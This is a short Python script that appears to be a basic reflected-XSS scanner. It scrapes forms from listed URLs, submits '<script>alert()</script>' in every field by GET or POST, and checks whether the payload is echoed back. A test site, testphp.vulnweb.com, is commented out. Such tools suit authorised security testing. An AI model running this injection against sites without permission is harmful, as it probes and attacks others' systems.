import scraping
import os
import sys
import requests
from bs4 import BeautifulSoup
import mechanize
from formName import extract_form_fields
import subprocess

baseurl=sys.argv[2]
scraping.main(sys.argv[1:])
#print("hello")

def get_values_not_null(form_d):
 a={} 
 for key in form_d:
  if not form_d.get(key)=='':
   continue
  else:
   a[key]=form_d.get(key)
 return a

def get_form_data(urrls):
 print("---------------------------------------------------------------------------------------------------------------------------")
 request = requests.get(urrls)
 parseHTML = BeautifulSoup(request.text, 'html.parser')
 htmlForm = parseHTML.form
 form_data=extract_form_fields(parseHTML)
 formTextArea=htmlForm.findAll('textarea')
 methodName = htmlForm['method']
 action_url=getTheAction(htmlForm,baseurl)
 #print(action_url)
 input_fields=get_fieldvalues(htmlForm)
 if not len(formTextArea)==0 :
  input_fields.append(formTextArea[0]['name'])
 sendRequest(action_url,input_fields,methodName)

def get_fieldvalues(htmlForm):
 inputs = htmlForm.find_all('input')
 inputFieldNames = []
 for items in inputs:
    if items.has_attr('name'):
        inputFieldNames.append(items['name'])
 return inputFieldNames

def get_value_of_param(input_f):
 result=''
 response={}
 for i in input_f:
  x="<script>alert()</script>"
  #result+=i+"="+x+"&"
  response[i]=x
 return response

def getTheAction(action,baseUrl):
 act=action['action']
 result=''
 if act.startswith("http") or act.startswith("https"):
  result=act
  return result
 elif act.startswith('/'):
  result=baseUrl+act
  return result
 else:
  result=baseUrl
  return result

def sendRequest(url,data,method):
 payload="<script>alert()</script>"
 if method=='post':
  res=requests.post(url,get_value_of_param(data))
 elif method=='get':
  res=requests.get(url,get_value_of_param(data))
 if payload in res.text:
  print("XSS found on "+url)
 else:
  print("XSS not found")
  #print(res.text)

def xss(urrls):
 try:
  print(urrls)
  get_form_data(urrls)
 except:
  pass

def looping():
 f=open('demofile.txt')
 lines=f.read().split("\n")
 #print(lines)
 f.close()
 for i in lines:
  xss(i)

looping()
#get_form_data("http://testphp.vulnweb.com/signup.php")
